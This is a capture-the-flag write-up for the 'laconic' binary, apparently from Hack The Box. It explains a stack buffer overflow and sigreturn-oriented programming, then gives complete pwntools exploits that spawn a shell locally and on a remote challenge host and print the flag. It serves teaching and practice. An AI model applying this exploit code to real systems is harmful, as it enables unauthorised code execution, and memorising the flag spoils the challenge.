# Laconic

## Table of contents

- [Preliminary analysis](#preliminary-analysis)
- [The vulnerability](#the-vulnerability)
- [Sigreturn-Oriented Programming (SROP)](#sigreturn-oriented-programming-SROP)
- [Observing a signal frame](#observing-a-signal-frame)
- [Forging a signal frame](#forging-a-signal-frame)
- [Solution to the pwnable](#solution-to-the-pwnable)

## Preliminary analysis

```console
❯ file laconic
laconic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

```console
❯ checksec laconic
[*] '/mnt/hgfs/corridor/pwn_laconic/laconic'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x42000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```console
❯ readelf laconic --all --wide
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x43000
  Start of program headers:          64 (bytes into file)
  Start of section headers:          4344 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         3
  Size of section headers:           64 (bytes)
  Number of section headers:         5
  Section header string table index: 4

Section Headers:
  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0
  [ 1] .shellcode        PROGBITS        0000000000043000 001000 00001a 00 WAX  0   0  1
  [ 2] .symtab           SYMTAB          0000000000000000 001020 000090 18      3   1  8
  [ 3] .strtab           STRTAB          0000000000000000 0010b0 000021 00      0   0  1
  [ 4] .shstrtab         STRTAB          0000000000000000 0010d1 000026 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), l (large), p (processor specific)

There are no section groups in this file.

Program Headers:
  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
  LOAD           0x000000 0x0000000000042000 0x0000000000042000 0x0000e8 0x0000e8 R   0x1000
  LOAD           0x001000 0x0000000000043000 0x0000000000043000 0x00001a 0x00001a RWE 0x1000
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RWE 0x10

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .shellcode 
   02     

There is no dynamic section in this file.

There are no relocations in this file.
No processor specific unwind information to decode

Symbol table '.symtab' contains 6 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000043000     0 NOTYPE  GLOBAL DEFAULT    1 __start
     2: 0000000000043000     0 NOTYPE  GLOBAL DEFAULT    1 _start
     3: 0000000000401000     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start
     4: 0000000000401000     0 NOTYPE  GLOBAL DEFAULT  ABS _edata
     5: 0000000000401000     0 NOTYPE  GLOBAL DEFAULT  ABS _end

No version information found in this file.
```

By virtue of its minimalism, this binary is immune to multiple binary exploitation primitives.  
For tiny binaries, we don't need disassemblers; `objdump` or `gdb` would suffice:

```console
❯ objdump -d laconic -M intel

laconic:     file format elf64-x86-64


Disassembly of section .shellcode:

0000000000043000 <__start>:
   43000:   48 c7 c7 00 00 00 00    mov    rdi,0x0
   43007:   48 89 e6                mov    rsi,rsp
   4300a:   48 83 ee 08             sub    rsi,0x8
   4300e:   48 c7 c2 06 01 00 00    mov    rdx,0x106
   43015:   0f 05                   syscall
   43017:   c3                      ret
   43018:   58                      pop    rax
   43019:   c3                      ret
```

The next step is to unravel the workings of this binary.

The `RAX` register determines the syscall but it is never explicitly set in the code.  
Since **the kernel hands over zeroed registers to a fresh process, we can expect RAX to be 0** - which corresponds to the `read` syscall.  
This deduction can be verified with `strace`:

```console
❯ echo '' | strace ./laconic
execve("./laconic", ["./laconic"], 0x7ffd8c547010 /* 46 vars */) = 0
read(0, "\n", 262)                      = 1
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x1} ---
+++ killed by SIGSEGV +++
```

On x86-64 Linux, a syscall is invoked by loading its number into RAX and its arguments into other registers, then executing the syscall instruction.  
The syscall table at <https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls/#x86_64-64-bit> can be consulted to map syscall numbers in RAX to the syscalls being made. It also maps other registers to the syscall arguments they represent.  
With that said, the syscall above can be summarized as follows:

| Register | Purpose | Value |
| --- | --- | --- |
| `RAX` | syscall number | `0` i.e. `read` |
| `RDI` | file descriptor | `0` i.e. `stdin` |
| `RSI` | destination buffer | `RSP - 8` i.e. 8 bytes below `RSP` |
| `RDX` | maximum bytes to read | `0x106` i.e. 262 bytes | 

In short: the binary reads up to 262 bytes from stdin into the stack.

## The vulnerability

The `read` call accepts up to 262 bytes, but the buffer is only 8 bytes. Therefore, the 9th byte onwards would overflow past RSP, clobbering the saved return address that `ret` would later pop into RIP (the instruction pointer, which holds the address of the next instruction the CPU would execute).  
Simply put, as long as suitable gadgets are available, we can hijack the control flow of the program.

Again, it can be verified with `strace`:

```console
❯ python3 -c "import sys; sys.stdout.buffer.write(b'A'*8 + b'B'*4)" | strace ./laconic
execve("./laconic", ["./laconic"], 0x7ffcf1d5f570 /* 46 vars */) = 0
read(0, "AAAAAAAABBBB", 262)            = 12
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+++ killed by SIGSEGV +++
```

Since the stack is `RWX`, we can put a shellcode into the buffer. However, we won't know where to jump because ASLR would randomize the address of shellcode on every run. We don't have any `jmp rsp` gadget either.  
Another option is to use Sigreturn-Oriented Programming (SROP). The prerequisites are:

- a buffer overflow large enough to hold a signal frame (~248 bytes)
- the ability to set `RAX` to 15
- a `syscall` gadget

The maximum input is 262 bytes, enough to accommodate a signal frame.  
We also have a `syscall` and a `pop rax; ret` gadget:

```console
❯ ROPgadget --binary ./laconic
Gadgets information
============================================================
0x0000000000043013 : add byte ptr [rax], al ; syscall
0x000000000004300f : mov edx, 0x106 ; syscall
0x000000000004300e : mov rdx, 0x106 ; syscall
0x000000000004300d : or byte ptr [rax - 0x39], cl ; ret 0x106
0x000000000004300c : out dx, al ; or byte ptr [rax - 0x39], cl ; ret 0x106
0x0000000000043018 : pop rax ; ret
0x0000000000043017 : ret
0x0000000000043010 : ret 0x106
0x0000000000043015 : syscall

Unique gadgets found: 9
```

Therefore, all conditions are met.  
Before getting to the solution, I'll expand this write-up to provide a crash course on Sigreturn-Oriented Programming (SROP).

## Sigreturn-Oriented Programming (SROP)

A signal is an asynchronous notification delivered to a process by the kernel when a certain event takes place.  
For example, the `SIGINT` signal when <kbd>Ctrl</kbd>+<kbd>C</kbd> is pressed, `SIGSEGV` on a bad memory access, and `SIGALRM` when a timer fires.

When a signal is sent to the process, the kernel suspends the process' normal execution and executes the appropriate `signal handler` function.  
`Signal handlers` are ordinary functions that are invoked when the signals for which they are registered are delivered.  
Processes can register their own custom `signal handlers` as well.

Now the fun part - how does the kernel detour a running process into a signal handler, and then how does it resume the original state as if nothing happened?  
The answer is straightforward - somewhere the kernel must take a complete snapshot of the current execution state (registers, stack pointer, flags, etc.) and restore it later.  
The kernel makes a snapshot of the process' user space CPU context and stores it on the stack in a "signal frame" (`struct rt_sigframe`).  
After the `signal handler` returns, a hidden syscall `rt_sigreturn` is invoked. `rt_sigreturn` reads the signal frame from the stack and restores the original user space CPU context.

The vulnerability is that anyone who controls the stack is able to set up such a signal frame. `rt_sigreturn` does not verify if the signal frame was set by the kernel.  
By calling the `rt_sigreturn` syscall, attackers may determine the next state for the program to execute arbitrary code. It is a powerful primitive which controls every register at once.

Reference: [Framing Signals - A Return to Portable Shellcode](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf)

## Observing a signal frame

Theoretically, the structure of the signal frame can be deduced from <https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/sigframe.h> and <https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/sigcontext.h>, but viewing it in practice is more stimulating.  
Let us make a tiny C program to observe the signal frame:

```c
#include <stdio.h>
#include <signal.h>
#include <unistd.h>

void handler(int sig) {
    puts("Signal handler invoked");
}

int main() {
    signal(SIGALRM, handler);
    alarm(1);
    while(1);
}
```

This program registers a handler for `SIGALRM`, arms a 1-second timer to deliver this signal, and freezes indefinitely with `while(1)`.  
Use the `-g` option with `gcc` to embed debugging information into the binary:

```console
❯ gcc -g -o sigdemo sigdemo.c
```

Fix how `gdb` handles `SIGALRM`:

```console
❯ gdb -q ./sigdemo
-----SNIP-----
gef➤  info signals SIGALRM
Signal        Stop  Print  Pass to program  Description
SIGALRM       No    Yes    No               Alarm clock
```

`Stop=No` implies `gdb` would not pause execution of the program at the signal.  
But we need `Stop=Yes` to observe the stack right before the signal.

`Pass to program=No` implies that `gdb` would not hand over the signal to our custom signal handler.  
We obviously don't want that.  
Change them all to yes:

```console
gef➤  handle SIGALRM stop print pass
Signal        Stop  Print  Pass to program  Description
SIGALRM       Yes   Yes    Yes              Alarm clock
```

`alarm(1)` sets an alarm for 1 second. After that, `alarm()` would return, and the program would get stuck on the `while(1)` infinite loop.  
Later, when 1 second elapses, `SIGALRM` would get delivered.  
Let's observe the process state at that moment:

```console
gef➤  r
```

```c
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffdf18  →  0x00007fffffffe248  →  "/mnt/hgfs/corridor/pwn_laconic/sigdemo"
$rcx   : 0x00007ffff7e942f7  →  <alarm+0007> cmp rax, 0xfffffffffffff001
$rdx   : 0x0               
$rsp   : 0x00007fffffffde00  →  0x0000000000000001
$rbp   : 0x00007fffffffde00  →  0x0000000000000001
$rsi   : 0x00007fffffffdb60  →  0x0000000000000000
$rdi   : 0x1               
$rip   : 0x0000555555555198  →  <main+0022> jmp 0x555555555198 <main+34>
$r8    : 0x00007fffffffdd50  →  0x0000000000000000
$r9    : 0x00007ffff7fccaa0  →   push rbp
$r10   : 0x3               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdf28  →  0x00007fffffffe26c  →  "SSH_AUTH_SOCK=/tmp/ssh-N37IyY01NfAQ/agent.1743"
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe5f0  →  0x0000555555554000  →  0x00010102464c457f
$r15   : 0x0000555555557dd8  →  0x0000555555555110  →  <__do_global_dtors_aux+0000> endbr64 
$eflags: [zero CARRY PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde00│+0x0000: 0x0000000000000001	 ← $rsp, $rbp
0x00007fffffffde08│+0x0008: 0x00007ffff7de0ca8  →   mov edi, eax
0x00007fffffffde10│+0x0010: 0x00007fffffffdf00  →  0x00007fffffffdf08  →  0x0000000000000038 ("8"?)
0x00007fffffffde18│+0x0018: 0x0000555555555176  →  <main+0000> push rbp
0x00007fffffffde20│+0x0020: 0x0000000155554040
0x00007fffffffde28│+0x0028: 0x00007fffffffdf18  →  0x00007fffffffe248  →  "/mnt/hgfs/corridor/pwn_laconic/sigdemo"
0x00007fffffffde30│+0x0030: 0x00007fffffffdf18  →  0x00007fffffffe248  →  "/mnt/hgfs/corridor/pwn_laconic/sigdemo"
0x00007fffffffde38│+0x0038: 0xb2cd348d9d23ea80
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555189 <main+0013>      call   0x555555555050 <signal@plt>
   0x55555555518e <main+0018>      mov    edi, 0x1
   0x555555555193 <main+001d>      call   0x555555555040 <alarm@plt>
 → 0x555555555198 <main+0022>      jmp    0x555555555198 <main+34>
   0x55555555519a                  add    BYTE PTR [rax], al
   0x55555555519c <_fini+0000>     sub    rsp, 0x8
   0x5555555551a0 <_fini+0004>     add    rsp, 0x8
   0x5555555551a4 <_fini+0008>     ret    
   0x5555555551a5                  add    BYTE PTR [rax], al
───────────────────────────────────────────────────────────────────────────────────────────────────────────── source:sigdemo.c+12 ────
      7	 }
      8	 
      9	 int main() {
     10	     signal(SIGALRM, handler);
     11	     alarm(1);
 →   12	     while(1);
     13	 }
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sigdemo", stopped 0x555555555198 in main (), reason: SIGALRM
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555198 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

It was stuck in the infinite loop before `SIGALRM` was raised. `gdb` GEF's default screen provides an overview of the program's state.

To find the signal frame, inspect the stack right before the signal handler function is executed:

```console
gef➤  break *handler
Breakpoint 1 at 0x555555555159: file sigdemo.c, line 5.
gef➤  c
```

```console
[#0] Id 1, Name: "sigdemo", stopped 0x555555555159 in handler (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555159 → handler(sig=0x0)
[#1] 0x7ffff7df6df0 → mov rax, 0xf
[#2] 0x555555555198 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/32gx $rsp
0x7fffffffd838:	0x00007ffff7df6df0	0x0000000000000007
0x7fffffffd848:	0x0000000000000000	0x0000000000000000
0x7fffffffd858:	0x0000000000000002	0x0000000000000000
0x7fffffffd868:	0x00007fffffffdd50	0x00007ffff7fccaa0
0x7fffffffd878:	0x0000000000000003	0x0000000000000202
0x7fffffffd888:	0x0000000000000000	0x00007fffffffdf28
0x7fffffffd898:	0x00007ffff7ffd000	0x0000555555557dd8
0x7fffffffd8a8:	0x0000000000000001	0x00007fffffffdb60
0x7fffffffd8b8:	0x00007fffffffde00	0x00007fffffffdf18
0x7fffffffd8c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd8d8:	0x00007ffff7e942f7	0x00007fffffffde00
0x7fffffffd8e8:	0x0000555555555198	0x0000000000000217
0x7fffffffd8f8:	0x002b000000000033	0x0000000000000000
0x7fffffffd908:	0x0000000000000001	0x0000000000000000
0x7fffffffd918:	0x0000000000000000	0x00007fffffffda00
0x7fffffffd928:	0x00000000ffffffff	0x00007ffff7dd2cc0
```

This structure is precisely the signal frame.  
On x86_64, it is laid out as follows:

```text
----------------------------------------------------
| 0x00 |      pretcode       |      uc_flags       |
| 0x10 |         &uc         |   uc_stack.ss_sp    |
| 0x20 |  uc_stack.ss_flags  |  uc_stack.ss_size   |
| 0x30 |         r8          |         r9          |
| 0x40 |         r10         |         r11         |
| 0x50 |         r12         |         r13         |
| 0x60 |         r14         |         r15         |
| 0x70 |         rdi         |         rsi         |
| 0x80 |         rbp         |         rbx         |
| 0x90 |         rdx         |         rax         |
| 0xA0 |         rcx         |         rsp         |
| 0xB0 |         rip         |       eflags        |
| 0xC0 |      cs/gs/fs       |         err         |
| 0xD0 |       trapno        |       oldmask       |
| 0xE0 |         cr2         |      &fpstate       |
| 0xF0 |     __reserved      |       sigmask       |
----------------------------------------------------
```

Try comparing these values in the signal frame against the values of registers and flags before `SIGALRM` was delivered; they'd match perfectly.

After the handler function is done executing, the `rt_sigreturn` syscall would take care of the cleanup - it would use the signal frame on stack to restore registers and flags to their original values.

In fact, we can see exactly how this syscall gets invoked by further inspecting the signal frame.  
When a `ret` instruction is executed, it sets the instruction pointer to the address dereferenced by the top of stack.  
As observed above, the top of stack is currently `rt_sigframe.pretcode`. Let's check what it dereferences to:

```console
gef➤  x/gx $rsp
0x7fffffffd838:	0x00007ffff7df6df0
gef➤  x/2i 0x00007ffff7df6df0
   0x7ffff7df6df0:	mov    rax,0xf
   0x7ffff7df6df7:	syscall
```

It points at the `__restore_rt` trampoline, which loads the syscall number for `rt_sigreturn` (15) into RAX and executes the syscall.

## Forging a signal frame

If an attacker can control the stack, set RAX, and use the syscall gadget, they can control every register at once.  
Usually, the lack of gadgets to control arbitrary registers is a major constraint to executing arbitrary syscalls.  
With control over every register, it is no longer an issue. That makes SROP a fearsome primitive.

Let us demonstrate it on `laconic` itself by forging a frame which calls `exit(51)`.  
The registers to be controlled are as follows:

| Register | Purpose | Value |
| --- | --- | --- |
| `RAX` | syscall number | `60` i.e. `exit` |
| `RDI` | status code | `51` |
| `RIP` | instruction pointer | `syscall` gadget |

Handcrafting the signal frame is not necessary, as pwntools supports [SigreturnFrame generation](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/rop/srop.py).

The final payload should be as follows:

- 8 bytes of padding to reach the return address
- `pop rax; ret` gadget to set RAX
- 15; to set RAX to 15
- `syscall` gadget
- the forged signal frame, to be used by `rt_sigreturn`

After `syscall` is executed, RSP would point to the start of the forged frame. `rt_sigreturn` would use it to set the registers.  
The RIP in signal frame is set to the `syscall` gadget again to call `exit`.

```py
from pwn import *
context.binary = exe = ELF('./laconic', checksec=False)

rop = ROP(exe)
syscall = rop.find_gadget(['syscall'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]

frame = SigreturnFrame()
frame.rax = 60 # exit syscall
frame.rdi = 51 # status code
frame.rip = syscall

payload = flat({
    8: [
        pop_rax,
        15, # rt_sigreturn syscall
        syscall,
        frame
    ]
})

p = process(exe.path)
p.sendline(payload)
p.interactive()
```

```console
❯ python3 exploit_exit.py
[*] Loaded 3 cached gadgets for './laconic'
[+] Starting local process '/mnt/hgfs/corridor/pwn_laconic/laconic': pid 2342
[*] Switching to interactive mode
[*] Process '/mnt/hgfs/corridor/pwn_laconic/laconic' stopped with exit code 51 (pid 2342)
[*] Got EOF while reading in interactive
```

It exited with code 51 as planned.

## Solution to the pwnable

Now, let's get back to the initial goal on `laconic` - to obtain a shell with `execve("/bin/sh", NULL, NULL)`.  
We have all the puzzle pieces needed to carry it out, with the exception of `/bin/sh`.  
Putting it on the stack would not work due to ASLR. Due to the constraint on payload size, we cannot use other syscalls either.

```console
❯ gdb -q ./laconic
-----SNIP-----
gef➤  r
Starting program: /mnt/hgfs/corridor/pwn_laconic/laconic 
1337
```

Once it segfaults, we can search for `/bin/sh` in memory:

```console
gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/mnt/hgfs/corridor/pwn_laconic/laconic'(0x43000-0x44000), permission=rwx
  0x43238 - 0x4323f  →   "/bin/sh" 
```

The string is available, but the author of the pwnable had crudely appended it to the binary:

```console
❯ xxd laconic | tail -2
00001220: 0000 0000 0000 0000 0100 0000 0000 0000  ................
00001230: 0000 0000 0000 0000 2f62 696e 2f73 6800  ......../bin/sh.
```

pwntools' `ELF.search` does not search outside of declared memory. We need to nudge it to inflate each segment's `p_filesz` to a full page:

```py
for seg in exe.segments:
    seg.header.p_filesz = 4096
```

To forge a frame which calls `execve("/bin/sh", NULL, NULL)`, the registers to be controlled are as follows:

| Register | Purpose | Value |
| --- | --- | --- |
| `RAX` | syscall number | `59` i.e. `execve` |
| `RDI` | command string | a pointer to `/bin/sh` |
| `RSI` | argv | `0` i.e. `NULL` |
| `RDX` | envp | `0` i.e. `NULL` |
| `RIP` | instruction pointer | `syscall` gadget |

Here is the full exploit.

```py
from pwn import *

exe = context.binary = ELF('./laconic', checksec=False)
# context.log_level = 'debug'

p = process(exe.path)
# p = remote('83.136.249.101', 35492)

offset = 8

rop = ROP(exe)
syscall = rop.find_gadget(['syscall'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]

# hack to search undeclared memory
for seg in exe.segments:
    seg.header.p_filesz = 4096

bin_sh = next(exe.search(b'/bin/sh\x00'))

frame = SigreturnFrame()
frame.rax = 59 # execve syscall
frame.rdi = bin_sh
frame.rsi = 0 # argv
frame.rdx = 0 # envp
frame.rip = syscall

payload = flat({
    offset: [
        pop_rax,
        15, # rt_sigreturn syscall
        syscall,
        frame
    ]
})

# gdb.attach(p, gdbscript=f'b* {syscall}')
p.sendline(payload)
p.interactive()
```

Running it locally against the binary pops a shell:

```console
❯ python3 exploit_srop.py
[+] Starting local process '/mnt/hgfs/corridor/pwn_laconic/laconic': pid 2595
[*] Loaded 3 cached gadgets for './laconic'
[*] Switching to interactive mode
$ whoami
intek
$ ls
exploit_srop.py  laconic
```

The same payload also lands a shell on the remote target:

```console
❯ python3 exploit_srop.py
[+] Opening connection to 83.136.249.101 on port 35492: Done
[*] Loaded 3 cached gadgets for './laconic'
[*] Switching to interactive mode
$ id
uid=100(ctf) gid=101(ctf) groups=101(ctf)
$ cat flag.txt
HTB{s1l3nt_r0p_21435b0f32f37faf8de355f7409395f8}
```
